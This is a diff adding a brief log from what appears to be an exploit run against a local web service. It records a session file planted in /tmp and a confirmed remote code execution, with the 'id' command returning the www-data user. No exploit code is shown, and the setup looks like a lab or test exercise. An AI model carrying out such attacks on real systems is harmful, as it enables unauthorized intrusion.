@@ -1,0 +1,8 @@
+[*] Target: http://127.0.0.1:8740
+[*] Command: id
+
+[attempt 1] SID=exploit8bdfb6f66d8d4a79b7ef file=/tmp/sess_exploit8bdfb6f66d8d4a79b7ef
+    plant=HTTP/1.1 200 OK
+[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+99
